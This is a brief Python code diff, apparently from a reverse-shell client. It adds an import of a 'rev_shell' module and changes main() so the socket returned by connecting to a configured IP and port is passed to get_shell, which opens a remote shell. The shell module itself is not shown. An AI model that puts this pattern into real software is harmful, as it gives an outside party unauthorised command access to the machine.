@@ -1,7 +1,9 @@
 import connection as conn
+import rev_shell as shell
 
 def main():
-    conn.connect(conn.IP, conn.PORT)
+    sock = conn.connect(conn.IP, conn.PORT)
+    shell.get_shell(sock)
     
 
 
